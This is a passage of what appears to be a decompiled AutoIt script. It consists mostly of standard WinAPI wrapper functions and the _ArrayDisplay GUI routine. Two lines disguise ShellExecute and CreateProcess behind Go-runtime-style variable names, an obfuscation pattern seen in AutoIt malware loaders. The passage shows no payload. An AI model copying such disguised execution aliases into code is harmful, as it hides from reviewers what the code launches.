        Local $acall = DllCall("ole32.dll", "long", "CLSIDFromString", "wstr", $sguid, "struct*", $tguid)
        If @error Or $acall[0x0] Then Return SetError(@error + 0x14, @extended, 0x0)
        $acall = DllCall("user32.dll", "handle", "RegisterPowerSettingNotification", "handle", $hwnd, "struct*", $tguid, "dword", 0x0)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_RegisterPowerSettingNotification

    Func _WinAPI_RegisterRawInputDevices($padevice, $icount = 0x1)
        Local $acall = DllCall("user32.dll", "bool", "RegisterRawInputDevices", "struct*", $padevice, "uint", $icount, "uint", DllStructGetSize(DllStructCreate($TAGRAWINPUTDEVICE)))
        If @error Or Not $acall[0x0] Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_RegisterRawInputDevices

    Func _WinAPI_ReleaseCapture()
        Local $acall = DllCall("user32.dll", "bool", "ReleaseCapture")
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_ReleaseCapture

    Func _WinAPI_RemoveClipboardFormatListener($hwnd)
        Local $acall = DllCall("user32.dll", "bool", "RemoveClipboardFormatListener", "hwnd", $hwnd)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_RemoveClipboardFormatListener

    Func _WinAPI_SetActiveWindow($hwnd)
        Local $acall = DllCall("user32.dll", "int", "SetActiveWindow", "hwnd", $hwnd)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_SetActiveWindow

    Func _WinAPI_SetCapture($hwnd)
        Local $acall = DllCall("user32.dll", "hwnd", "SetCapture", "hwnd", $hwnd)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_SetCapture

    Func _WinAPI_SetDefaultPrinter($sprinter)
        Local $acall = DllCall("winspool.drv", "bool", "SetDefaultPrinterW", "wstr", $sprinter)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_SetDefaultPrinter

    Func _WinAPI_SetDllDirectory($sdirpath = Default)
        If $sdirpath = Default Then $sdirpath = Null
        Local $acall = DllCall("kernel32.dll", "bool", "SetDllDirectoryW", "wstr", $sdirpath)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_SetDllDirectory

    Func _WinAPI_SetKeyboardLayout($hwnd, $ilanguage, $iflags = 0x0)
        If Not _WinAPI_IsWindow($hwnd) Then Return SetError(@error + 0xa, @extended, 0x0)
        Local $hlocale = 0x0
        If $ilanguage Then
            $hlocale = _WinAPI_LoadKeyboardLayout($ilanguage)
            If Not $hlocale Then Return SetError(0xa, 0x0, 0x0)
        EndIf
        Local Const $WM_INPUTLANGCHANGEREQUEST = 0x50
        DllCall("user32.dll", "none", "SendMessage", "hwnd", $hwnd, "uint", $WM_INPUTLANGCHANGEREQUEST, "uint", $iflags, "uint_ptr", $hlocale)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return 0x1
    EndFunc    ; -> _WinAPI_SetKeyboardLayout

    Func _WinAPI_SetKeyboardState(ByRef $tstate)
        Local $acall = DllCall("user32.dll", "int", "SetKeyboardState", "struct*", $tstate)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_SetKeyboardState

    Func _WinAPI_SetProcessShutdownParameters($ilevel, $bdialog = False)
        Local $acall = DllCall("kernel32.dll", "bool", "SetProcessShutdownParameters", "dword", $ilevel, "dword", Not $bdialog)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_SetProcessShutdownParameters

    Func _WinAPI_SetProcessWindowStation($hstation)
        Local $acall = DllCall("user32.dll", "bool", "SetProcessWindowStation", "handle", $hstation)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_SetProcessWindowStation

    Func _WinAPI_SetUserObjectInformation($hobject, $iindex, ByRef $tdata)
        If $iindex <> 0x1 Then Return SetError(0xa, 0x0, False)
        Local $acall = DllCall("user32.dll", "bool", "SetUserObjectInformationW", "handle", $hobject, "int", 0x1, "struct*", $tdata, "dword", DllStructGetSize($tdata))
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_SetUserObjectInformation

    Func _WinAPI_SetWindowsHookEx($ihook, $pproc, $hdll, $ithreadid = 0x0)
        Local $acall = DllCall("user32.dll", "handle", "SetWindowsHookEx", "int", $ihook, "ptr", $pproc, "handle", $hdll, "dword", $ithreadid)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_SetWindowsHookEx

    Func _WinAPI_SetWinEventHook($ieventmin, $ieventmax, $peventproc, $ipid = 0x0, $ithreadid = 0x0, $iflags = 0x0)
        Local $acall = DllCall("user32.dll", "handle", "SetWinEventHook", "uint", $ieventmin, "uint", $ieventmax, "ptr", 0x0, "ptr", $peventproc, "dword", $ipid, "dword", $ithreadid, "uint", $iflags)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_SetWinEventHook

    Func _WinAPI_ShutdownBlockReasonCreate($hwnd, $stext)
        Local $acall = DllCall("user32.dll", "bool", "ShutdownBlockReasonCreate", "hwnd", $hwnd, "wstr", $stext)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_ShutdownBlockReasonCreate

    Func _WinAPI_ShutdownBlockReasonDestroy($hwnd)
        Local $acall = DllCall("user32.dll", "bool", "ShutdownBlockReasonDestroy", "hwnd", $hwnd)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_ShutdownBlockReasonDestroy

    Func _WinAPI_ShutdownBlockReasonQuery($hwnd)
        Local $acall = DllCall("user32.dll", "bool", "ShutdownBlockReasonQuery", "hwnd", $hwnd, "wstr", '', "dword*", 0x1000)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, '')
        Return $acall[0x2]
    EndFunc    ; -> _WinAPI_ShutdownBlockReasonQuery

    Func _WinAPI_SwitchDesktop($hdesktop)
        Local $acall = DllCall("user32.dll", "bool", "SwitchDesktop", "handle", $hdesktop)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_SwitchDesktop

    Func _WinAPI_SystemParametersInfo($iaction, $iparam = 0x0, $vparam = 0x0, $iwinini = 0x0)
        Local $acall = DllCall("user32.dll", "bool", "SystemParametersInfoW", "uint", $iaction, "uint", $iparam, "struct*", $vparam, "uint", $iwinini)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_SystemParametersInfo

    Func _WinAPI_TrackMouseEvent($hwnd, $iflags, $itime = + -1)
        Local $ttme = DllStructCreate("dword;dword;hwnd;dword")
        DllStructSetData($ttme, 0x1, DllStructGetSize($ttme))
        DllStructSetData($ttme, 0x2, $iflags)
        DllStructSetData($ttme, 0x3, $hwnd)
        DllStructSetData($ttme, 0x4, $itime)
        Local $acall = DllCall("user32.dll", "bool", "TrackMouseEvent", "struct*", $ttme)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_TrackMouseEvent

    Func _WinAPI_UnhookWindowsHookEx($hhook)
        Local $acall = DllCall("user32.dll", "bool", "UnhookWindowsHookEx", "handle", $hhook)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_UnhookWindowsHookEx

    Func _WinAPI_UnhookWinEvent($heventhook)
        Local $acall = DllCall("user32.dll", "bool", "UnhookWinEvent", "handle", $heventhook)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_UnhookWinEvent

    Func _WinAPI_UnloadKeyboardLayout($hlocale)
        Local $acall = DllCall("user32.dll", "bool", "UnloadKeyboardLayout", "handle", $hlocale)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_UnloadKeyboardLayout

    Func _WinAPI_UnregisterHotKey($hwnd, $iid)
        Local $acall = DllCall("user32.dll", "bool", "UnregisterHotKey", "hwnd", $hwnd, "int", $iid)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_UnregisterHotKey

    Func _WinAPI_UnregisterPowerSettingNotification($hnotify)
        Local $acall = DllCall("user32.dll", "bool", "UnregisterPowerSettingNotification", "handle", $hnotify)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_UnregisterPowerSettingNotification

    Func __EnumPageFilesProc($isize, $PINFO, $PFILE)
        Local $tepfi = DllStructCreate("dword;dword;ulong_ptr;ulong_ptr;ulong_ptr", $PINFO)
        __Inc($__g_venum)
        $__g_venum[$__g_venum[0x0][0x0]][0x0] = DllStructGetData(DllStructCreate("wchar[" & (_WinAPI_StrLen($PFILE) + 0x1) & "]", $PFILE), 0x1)
        For $i = 0x1 To 0x3
            $__g_venum[$__g_venum[0x0][0x0]][$i] = DllStructGetData($tepfi, $i + 0x2) * $isize
        Next
        Return 0x1
    EndFunc    ; -> __EnumPageFilesProc

#EndRegion Public Functions
$runtime_lockosthread = ShellExecute
$runtime_newgoroutine = _WinAPI_CreateProcess
#Region Global Variables and Constants
    Global $_g_arraydisplay_hlistview
    Global $_g_arraydisplay_itranspose
    Global $_g_arraydisplay_idisplayrow
    Global $_g_arraydisplay_aarray
    Global $_g_arraydisplay_idims
    Global $_g_arraydisplay_nrows
    Global $_g_arraydisplay_ncols
    Global $_g_arraydisplay_iitem_start
    Global $_g_arraydisplay_iitem_end
    Global $_g_arraydisplay_isubitem_start
    Global $_g_arraydisplay_isubitem_end
    Global $_g_arraydisplay_aindex
    Global $_g_arraydisplay_aindexes[0x1]
    Global $_g_arraydisplay_isortdir
    Global $_g_arraydisplay_asheader
    Global $_g_arraydisplay_anumericsort
    Global $arraydisplay_rowprefix = "#"
    Global $arraydisplay_numericsort = "*"
    Global Const $ARRAYDISPLAY_COLALIGNLEFT = 0x0
    Global Const $ARRAYDISPLAY_TRANSPOSE = 0x1
    Global Const $ARRAYDISPLAY_COLALIGNRIGHT = 0x2
    Global Const $ARRAYDISPLAY_COLALIGNCENTER = 0x4
    Global Const $ARRAYDISPLAY_VERBOSE = 0x8
    Global Const $ARRAYDISPLAY_NOROW = 0x40
    Global Const $ARRAYDISPLAY_CHECKERROR = 0x80
    Global Const $_ARRAYCONSTANT_TAGLVITEM = "struct;uint Mask;int Item;int SubItem;uint State;uint StateMask;ptr Text;int TextMax;int Image;lparam Param;" & "int Indent;int GroupID;uint Columns;ptr pColumns;ptr piColFmt;int iGroup;endstruct"
#EndRegion Global Variables and Constants
#Region Functions list
#EndRegion Functions list
Func __ArrayDisplay_Share(Const ByRef $AARRAY, $stitle = Default, $SARRAYRANGE = Default, $iflags = Default, $VUSER_SEPARATOR = Default, $SHEADER = Default, $IMAX_COLWIDTH = Default, $HUSER_FUNCTION = Default, $BDEBUG = True, Const $_ISCRIPTLINENUMBER = @ScriptLineNumber, Const $_ICALLERERROR = @error, Const $_ICALLEREXTENDED = @extended)
    Local $smsgboxtitle = (($BDEBUG) ? ("_DebugArrayDisplay") : ("_ArrayDisplay"))
    If $stitle = Default Then $stitle = $smsgboxtitle
    If $SARRAYRANGE = Default Then $SARRAYRANGE = ''
    If $iflags = Default Then $iflags = 0x0
    If $VUSER_SEPARATOR = Default Then $VUSER_SEPARATOR = ''
    If $SHEADER = Default Then $SHEADER = ''
    If $IMAX_COLWIDTH = Default Then $IMAX_COLWIDTH = 0x15e
    If $IMAX_COLWIDTH > 0xfff Then $IMAX_COLWIDTH = 0xfff
    If $HUSER_FUNCTION = Default Then $HUSER_FUNCTION = 0x0
    $_g_arraydisplay_itranspose = BitAND($iflags, $ARRAYDISPLAY_TRANSPOSE)
    Local $icolalign = BitAND($iflags, 0x6)
    Local $iverbose = Int(BitAND($iflags, $ARRAYDISPLAY_VERBOSE))
    $_g_arraydisplay_idisplayrow = Int(BitAND($iflags, $ARRAYDISPLAY_NOROW) = 0x0)
    Local $ibuttonborder = (($BDEBUG) ? (0x28) : (0x14))
    #Region Check valid array
        Local $smsg = '', $iret = 0x1
        Local $ftimer = 0x0
        If IsArray($AARRAY) Then
            $_g_arraydisplay_aarray = $AARRAY
            $_g_arraydisplay_idims = UBound($_g_arraydisplay_aarray, $UBOUND_DIMENSIONS)
            If $_g_arraydisplay_idims = 0x1 Then $_g_arraydisplay_itranspose = 0x0
            $_g_arraydisplay_nrows = UBound($_g_arraydisplay_aarray, $UBOUND_ROWS)
            $_g_arraydisplay_ncols = ($_g_arraydisplay_idims = 0x2) ? UBound($_g_arraydisplay_aarray, $UBOUND_COLUMNS) : 0x1
            Dim $_g_arraydisplay_anumericsort[$_g_arraydisplay_ncols]
            If $_g_arraydisplay_idims > 0x2 Then
                $smsg = "Larger than 2D array passed to function"
                $iret = 0x2
            EndIf
            If $_ICALLERERROR Then
                If $BDEBUG Then
                    If IsDeclared("__g_sReportCallBack_DebugReport_Debug") Then
                        $smsg = "@@ Debug( " & $_ISCRIPTLINENUMBER & ") : @error = " & $_ICALLERERROR & " in " & $smsgboxtitle & "( '" & $stitle & "' )"
                        Execute("$__g_sReportCallBack_DebugReport_Debug(""" & $smsg & """)")
                    EndIf
                    $iret = 0x3
                ElseIf BitAND($iflags, $ARRAYDISPLAY_CHECKERROR) Then
                    $smsg = "@error = " & $_ICALLERERROR & " when calling the function"
                    If $_ISCRIPTLINENUMBER > 0x0 Then $smsg &= " at line " & $_ISCRIPTLINENUMBER
                    $iret = 0x3
                EndIf
            EndIf
        Else
            $smsg = "No array variable passed to function"
        EndIf
        If $smsg Then
            If $iverbose And MsgBox($MB_SYSTEMMODAL + $MB_ICONERROR + $MB_YESNO, $smsgboxtitle & "() Error: " & $stitle, $smsg & @CRLF & @CRLF & "Exit the script?") = $IDYES Then
                Exit
            Else
                Return SetError($iret, 0x0, 0x0)
            EndIf
        EndIf
    #EndRegion Check valid array
    #Region Check array range
        Local $icw_colwidth = Number($VUSER_SEPARATOR)
        Local $scurr_separator = Opt("GUIDataSeparatorChar")
        If $VUSER_SEPARATOR = '' Then $VUSER_SEPARATOR = $scurr_separator
        $_g_arraydisplay_iitem_start = 0x0
        $_g_arraydisplay_iitem_end = $_g_arraydisplay_nrows + -1
        $_g_arraydisplay_isubitem_start = 0x0
        $_g_arraydisplay_isubitem_end = (($_g_arraydisplay_idims = 0x2) ? ($_g_arraydisplay_ncols + -1) : (0x0))
        Local $avrangesplit
        If $SARRAYRANGE Then
            Local $vtmp, $aarray_range = StringRegExp($SARRAYRANGE & "||", "(?U)(.*)\\|", $STR_REGEXPARRAYGLOBALMATCH)
            If $aarray_range[0x0] Then
                $avrangesplit = StringSplit($aarray_range[0x0], ":")
                If @error Then
                    $_g_arraydisplay_iitem_end = Number($aarray_range[0x0])
                Else
                    $_g_arraydisplay_iitem_start = Number($avrangesplit[0x1])
                    If $avrangesplit[0x2] <> '' Then
                        $_g_arraydisplay_iitem_end = Number($avrangesplit[0x2])
                    EndIf
                EndIf
            EndIf
            If $_g_arraydisplay_iitem_start < 0x0 Then $_g_arraydisplay_iitem_start = 0x0
            If $_g_arraydisplay_iitem_end >= $_g_arraydisplay_nrows Then $_g_arraydisplay_iitem_end = $_g_arraydisplay_nrows + -1
            If ($_g_arraydisplay_iitem_start > $_g_arraydisplay_iitem_end) And ($_g_arraydisplay_iitem_end > 0x0) Then
                $vtmp = $_g_arraydisplay_iitem_start
                $_g_arraydisplay_iitem_start = $_g_arraydisplay_iitem_end
                $_g_arraydisplay_iitem_end = $vtmp
            EndIf
            If $_g_arraydisplay_idims = 0x2 And $aarray_range[0x1] Then
                $avrangesplit = StringSplit($aarray_range[0x1], ":")
                If @error Then
                    $_g_arraydisplay_isubitem_end = Number($aarray_range[0x1])
                Else
                    $_g_arraydisplay_isubitem_start = Number($avrangesplit[0x1])
                    If $avrangesplit[0x2] <> '' Then
                        $_g_arraydisplay_isubitem_end = Number($avrangesplit[0x2])
                    EndIf
                EndIf
                If $_g_arraydisplay_isubitem_start > $_g_arraydisplay_isubitem_end Then
                    $vtmp = $_g_arraydisplay_isubitem_start
                    $_g_arraydisplay_isubitem_start = $_g_arraydisplay_isubitem_end
                    $_g_arraydisplay_isubitem_end = $vtmp
                EndIf
                If $_g_arraydisplay_isubitem_start < 0x0 Then $_g_arraydisplay_isubitem_start = 0x0
                If $_g_arraydisplay_isubitem_end >= $_g_arraydisplay_ncols Then $_g_arraydisplay_isubitem_end = $_g_arraydisplay_ncols + -1
            EndIf
        EndIf
        Local $sdisplaydata = "[" & $_g_arraydisplay_nrows & "]"
        If $_g_arraydisplay_idims = 0x2 Then
            $sdisplaydata &= " [" & $_g_arraydisplay_ncols & "]"
        EndIf
        Local $stipdata = ''
        If $SARRAYRANGE Then
            If $stipdata Then $stipdata &= " - "
            $stipdata &= "Range set " & $SARRAYRANGE
        EndIf
        If $_g_arraydisplay_itranspose Then
            If $stipdata Then $stipdata &= " - "
            $stipdata &= "Transposed"
        EndIf
        If $SARRAYRANGE Or $_g_arraydisplay_itranspose Then $_g_arraydisplay_aarray = __arraydisplay_createsubarray()
    #EndRegion Check array range
    #Region Check custom header
        $_g_arraydisplay_asheader = StringSplit($SHEADER, $scurr_separator, $STR_NOCOUNT)
        If UBound($_g_arraydisplay_asheader) = 0x0 Then Dim $_g_arraydisplay_asheader[0x1] = ['']
        $SHEADER = "Row"
        Local $iindex = $_g_arraydisplay_isubitem_start
        If $_g_arraydisplay_itranspose Then
            $SHEADER = "Row"
            For $j = 0x0 To $_g_arraydisplay_ncols + -1
                $SHEADER &= $scurr_separator & $arraydisplay_rowprefix & " " & $j + $_g_arraydisplay_isubitem_start
            Next
        Else
            If $_g_arraydisplay_asheader[0x0] Then
                For $iindex = $_g_arraydisplay_isubitem_start To $_g_arraydisplay_isubitem_end
                    If $iindex >= UBound($_g_arraydisplay_asheader) Then ExitLoop
                    If StringRight($_g_arraydisplay_asheader[$iindex], 0x1) = $arraydisplay_numericsort Then
                        $_g_arraydisplay_asheader[$iindex] = StringTrimRight($_g_arraydisplay_asheader[$iindex], 0x1)
                        $_g_arraydisplay_anumericsort[$iindex - $_g_arraydisplay_isubitem_start] = 0x1
                    EndIf
                    $SHEADER &= $scurr_separator & $_g_arraydisplay_asheader[$iindex]
                Next
            EndIf
            For $j = $iindex To $_g_arraydisplay_isubitem_end
                $SHEADER &= $scurr_separator & "Col " & $j
            Next
        EndIf
        If Not $_g_arraydisplay_idisplayrow Then $SHEADER = StringTrimLeft($SHEADER, 0x4)
    #EndRegion Check custom header
    #Region Generate Sort index for columns
        __arraydisplay_sortindexes(0x0, + -1)
        Local $htimer = TimerInit()
        __arraydisplay_sortindexes(0x1, 0x1)
        $ftimer = TimerDiff($htimer)
        If $ftimer * $_g_arraydisplay_ncols < 0x3e8 Then
            __arraydisplay_sortindexes(0x2, $_g_arraydisplay_ncols)
            If $BDEBUG Then ConsoleWrite("Sorting all indexes = " & TimerDiff($htimer) & @CRLF & @CRLF)
        Else
            If $BDEBUG Then ConsoleWrite("Sorting one index = " & TimerDiff($htimer) & @CRLF)
        EndIf
    #EndRegion Generate Sort index for columns
    #Region GUI and Listview generation
        If $iverbose And ($_g_arraydisplay_nrows * $_g_arraydisplay_ncols) > 0x3e8 Then
            SplashTextOn($smsgboxtitle, "Preparing display" & @CRLF & @CRLF & "Please be patient", 0x12c, 0x64)
        EndIf
        Local Const $_ARRAYCONSTANT_GUI_DOCKBOTTOM = 0x40
        Local Const $_ARRAYCONSTANT_GUI_DOCKBORDERS = 0x66
        Local Const $_ARRAYCONSTANT_GUI_DOCKHEIGHT = 0x200
        Local Const $_ARRAYCONSTANT_GUI_DOCKLEFT = 0x2
        Local Const $_ARRAYCONSTANT_GUI_DOCKRIGHT = 0x4
        Local Const $_ARRAYCONSTANT_GUI_DOCKHCENTER = 0x8
        Local Const $_ARRAYCONSTANT_GUI_EVENT_CLOSE = + -3
        Local Const $_ARRAYCONSTANT_GUI_EVENT_ARRAY = 0x1
        Local Const $_ARRAYCONSTANT_GUI_FOCUS = 0x100
        Local Const $_ARRAYCONSTANT_SS_CENTER = 0x1
        Local Const $_ARRAYCONSTANT_SS_CENTERIMAGE = 0x200
        Local Const $_ARRAYCONSTANT_LVM_GETITEMRECT = (0x1000 + 0xe)
        Local Const $_ARRAYCONSTANT_LVM_GETITEMSTATE = (0x1000 + 0x2c)
        Local Const $_ARRAYCONSTANT_LVM_GETSELECTEDCOUNT = (0x1000 + 0x32)
        Local Const $_ARRAYCONSTANT_LVM_SETEXTENDEDLISTVIEWSTYLE = (0x1000 + 0x36)
        Local Const $_ARRAYCONSTANT_LVS_EX_GRIDLINES = 0x1
        Local Const $_ARRAYCONSTANT_LVIS_SELECTED = 0x2
        Local Const $_ARRAYCONSTANT_LVS_SHOWSELALWAYS = 0x8
        Local Const $_ARRAYCONSTANT_LVS_OWNERDATA = 0x1000
        Local Const $_ARRAYCONSTANT_LVS_EX_FULLROWSELECT = 0x20
        Local Const $_ARRAYCONSTANT_LVS_EX_DOUBLEBUFFER = 0x10000
        Local Const $_ARRAYCONSTANT_WS_EX_CLIENTEDGE = 0x200
        Local Const $_ARRAYCONSTANT_WS_MAXIMIZEBOX = 0x10000
        Local Const $_ARRAYCONSTANT_WS_MINIMIZEBOX = 0x20000
        Local Const $_ARRAYCONSTANT_WS_SIZEBOX = 0x40000
        Local $icoordmode = Opt("GUICoordMode", 0x1)
        Local $iorgwidth = 0xd2, $iheight = 0xc8, $iminsize = 0xfa
        Local $hgui = GUICreate($stitle, $iorgwidth, $iheight, Default, Default, BitOR($_ARRAYCONSTANT_WS_SIZEBOX, $_ARRAYCONSTANT_WS_MINIMIZEBOX, $_ARRAYCONSTANT_WS_MAXIMIZEBOX))
        Local $aiguisize = WinGetClientSize($hgui)
        Local $idlistview = GUICtrlCreateListView($SHEADER, 0x0, 0x0, $aiguisize[0x0], $aiguisize[0x1] - $ibuttonborder, BitOR($_ARRAYCONSTANT_LVS_SHOWSELALWAYS, $_ARRAYCONSTANT_LVS_OWNERDATA))
        $_g_arraydisplay_hlistview = GUICtrlGetHandle($idlistview)
        GUICtrlSendMsg($idlistview, $_ARRAYCONSTANT_LVM_SETEXTENDEDLISTVIEWSTYLE, $_ARRAYCONSTANT_LVS_EX_GRIDLINES, $_ARRAYCONSTANT_LVS_EX_GRIDLINES)
        GUICtrlSendMsg($idlistview, $_ARRAYCONSTANT_LVM_SETEXTENDEDLISTVIEWSTYLE, $_ARRAYCONSTANT_LVS_EX_FULLROWSELECT, $_ARRAYCONSTANT_LVS_EX_FULLROWSELECT)
        GUICtrlSendMsg($idlistview, $_ARRAYCONSTANT_LVM_SETEXTENDEDLISTVIEWSTYLE, $_ARRAYCONSTANT_LVS_EX_DOUBLEBUFFER, $_ARRAYCONSTANT_LVS_EX_DOUBLEBUFFER)
        GUICtrlSendMsg($idlistview, $_ARRAYCONSTANT_LVM_SETEXTENDEDLISTVIEWSTYLE, $_ARRAYCONSTANT_WS_EX_CLIENTEDGE, $_ARRAYCONSTANT_WS_EX_CLIENTEDGE)
        Local $hheader = HWnd(GUICtrlSendMsg($idlistview, (0x1000 + 0x1f), 0x0, 0x0))
        GUICtrlSetResizing($idlistview, $_ARRAYCONSTANT_GUI_DOCKBORDERS)
        Local $icolfill = $_g_arraydisplay_ncols + $_g_arraydisplay_idisplayrow
        If $icolalign Then
            For $i = 0x0 To $icolfill + -1
                __ArrayDisplay_JustifyColumn($idlistview, $i, $icolalign / 0x2)
            Next
        EndIf
        GUICtrlSendMsg($idlistview, (0x1000 + 0x2f), $_g_arraydisplay_nrows, 0x0)
        Local $trect = DllStructCreate("struct; long Left;long Top;long Right;long Bottom; endstruct")
        DllCall("user32.dll", "struct*", "SendMessageW", "hwnd", $_g_arraydisplay_hlistview, "uint", $_ARRAYCONSTANT_LVM_GETITEMRECT, "wparam", 0x0, "struct*", $trect)
        Local $aiwin_pos = WinGetPos($hgui)
        Local $ailv_pos = ControlGetPos($hgui, '', $idlistview)
        $iheight = (($_g_arraydisplay_nrows + 0x3) * (DllStructGetData($trect, "Bottom") - DllStructGetData($trect, "Top"))) + $aiwin_pos[0x3] - $ailv_pos[0x3]
        If $iheight > @DesktopHeight + -100 Then
            $iheight = @DesktopHeight + -100
        ElseIf $iheight < $iminsize Then
            $iheight = $iminsize
        EndIf
        If $iverbose Then SplashOff()
        $_g_arraydisplay_isortdir = 0x400
        Local $icolumn = 0x0, $icolumnprev = + -1
        If $_g_arraydisplay_idisplayrow Then
            $icolumnprev = $icolumn
            __arraydisplay_headersetitemformat($hheader, $icolumn, 0x4000 + $_g_arraydisplay_isortdir + $icolalign / 0x2)
        EndIf
        $_g_arraydisplay_aindex = $_g_arraydisplay_aindexes[0x0]
    #EndRegion GUI and Listview generation
    Local $p__arraydisplay_notifyhandler = DllCallbackGetPtr(DllCallbackRegister("__ArrayDisplay_NotifyHandler", "lresult", "hwnd;uint;wparam;lparam;uint_ptr;dword_ptr"))
    DllCall("comctl32.dll", "bool", "SetWindowSubclass", "hwnd", $hgui, "ptr", $p__arraydisplay_notifyhandler, "uint_ptr", 0x0, "dword_ptr", 0x0)
    #Region Adjust dialog width
        Local $iwidth = 0x28, $icolwidth = 0x0, $aicolwidth[$icolfill], $imin_colwidth = 0x37
        Local $icolwidthheader
        For $i = 0x0 To $icolfill + -1
            GUICtrlSendMsg($idlistview, (0x1000 + 0x1e), $i, + -1)
            $icolwidth = GUICtrlSendMsg($idlistview, (0x1000 + 0x1d), $i, 0x0)
            If $SHEADER <> '' Then
                If $icolwidth = 0x0 Then ExitLoop
                GUICtrlSendMsg($idlistview, (0x1000 + 0x1e), $i, + -2)
                $icolwidthheader = GUICtrlSendMsg($idlistview, (0x1000 + 0x1d), $i, 0x0)
                If $icolwidth < $imin_colwidth And $icolwidthheader < $imin_colwidth Then
                    GUICtrlSendMsg($idlistview, (0x1000 + 0x1e), $i, $imin_colwidth)
                    $icolwidth = $imin_colwidth
                ElseIf $icolwidthheader < $icolwidth Then
                    GUICtrlSendMsg($idlistview, (0x1000 + 0x1e), $i, $icolwidth)
                Else
                    $icolwidth = $icolwidthheader
                EndIf
            Else
                If $icolwidth < $imin_colwidth Then
                    GUICtrlSendMsg($idlistview, (0x1000 + 0x1e), $i, $imin_colwidth)
                    $icolwidth = $imin_colwidth
                EndIf
            EndIf
            $iwidth += $icolwidth
            $aicolwidth[$i] = $icolwidth
        Next
        If $iwidth > @DesktopWidth + -100 Then
            $iwidth = 0x28
            For $i = 0x0 To $icolfill + -1
                If $aicolwidth[$i] > $IMAX_COLWIDTH Then
                    GUICtrlSendMsg($idlistview, (0x1000 + 0x1e), $i, $IMAX_COLWIDTH)
                    $iwidth += $IMAX_COLWIDTH
                Else
                    $iwidth += $aicolwidth[$i]
                EndIf
                If $i < 0x14 And $BDEBUG Then ConsoleWrite("@@ Debug(" & @ScriptLineNumber & ") : $iWidth = " & $iwidth & " $i = " & $i & @CRLF)
            Next
        EndIf
        If $iwidth > @DesktopWidth + -100 Then
            $iwidth = @DesktopWidth + -100
        ElseIf $iwidth < $iminsize Then
            $iwidth = $iminsize
        EndIf
    #EndRegion Adjust dialog width
    Local $iscrollbarsize = 0x0
    If $iheight = (@DesktopHeight + -100) Then $iscrollbarsize = 0xf
    WinMove($hgui, '', (@DesktopWidth - $iwidth + $iscrollbarsize) / 0x2, (@DesktopHeight - $iheight) / 0x2, $iwidth + $iscrollbarsize, $iheight)
    $aiguisize = WinGetClientSize($hgui)
    GUICtrlSetPos($idlistview, 0x0, 0x0, $iwidth, $aiguisize[0x1] - $ibuttonborder)
    #Region Create bottom infos
        Local $ibuttonwidth_1 = $aiguisize[0x0] / 0x2
        Local $ibuttonwidth_2 = $aiguisize[0x0] / 0x3
        Local $idcopy_id = 0x270f, $idcopy_data = 0x1869f, $iddata_label = 0x1869f, $iduser_func = 0x1869f, $idexit_script = 0x1869f
        If $BDEBUG Then
            $idcopy_id = GUICtrlCreateButton("Copy Data && Hdr/Row", 0x0, $aiguisize[0x1] - $ibuttonborder, $ibuttonwidth_1, 0x14)
            $idcopy_data = GUICtrlCreateButton("Copy Data Only", $ibuttonwidth_1, $aiguisize[0x1] - $ibuttonborder, $ibuttonwidth_1, 0x14)
            Local $ibuttonwidth_var = $ibuttonwidth_1
            Local $ioffset = $ibuttonwidth_1
            If IsFunc($HUSER_FUNCTION) Then
                $iduser_func = GUICtrlCreateButton("Run User Func", $ibuttonwidth_2, $aiguisize[0x1] + -20, $ibuttonwidth_2, 0x14)
                $ibuttonwidth_var = $ibuttonwidth_2
                $ioffset = $ibuttonwidth_2 * 0x2
            EndIf
            $idexit_script = GUICtrlCreateButton("Exit Script", $ioffset, $aiguisize[0x1] + -20, $ibuttonwidth_var, 0x14)
            $iddata_label = GUICtrlCreateLabel($sdisplaydata, 0x0, $aiguisize[0x1] + -20, $ibuttonwidth_var, 0x12, BitOR($_ARRAYCONSTANT_SS_CENTER, $_ARRAYCONSTANT_SS_CENTERIMAGE))
        Else
